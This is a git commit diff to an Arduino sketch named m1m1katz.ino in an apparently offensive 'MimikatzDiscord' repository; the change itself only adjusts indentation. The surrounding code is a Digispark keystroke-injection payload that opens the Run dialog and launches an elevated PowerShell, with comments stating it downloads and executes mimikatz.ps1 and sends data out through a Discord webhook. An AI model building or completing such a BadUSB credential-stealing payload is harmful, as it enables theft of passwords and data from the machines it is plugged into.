b0d8a3e998a979e252d285d0fea6f30fbd8eed85
Charles The Great <27988707+CharlesTheGreat77@users.noreply.github.com>
2023-10-26 11:14:11 -0700

    Update m1m1katz.ino

--- MimikatzDiscord/m1m1katz.ino
+++ MimikatzDiscord/m1m1katz.ino
@@ -8,7 +8,7 @@ void loop() {
 	DigiKeyboard.sendKeyStroke(0);
 	// Download and Execute mimikatz.ps1
 	// send data via discord webhook
-    DigiKeyboard.delay(500);
+   DigiKeyboard.delay(500);
 	DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
 	DigiKeyboard.delay(500);
 	DigiKeyboard.print("powershell -Noprofile \"Start-Process powershell -verb runas\"");
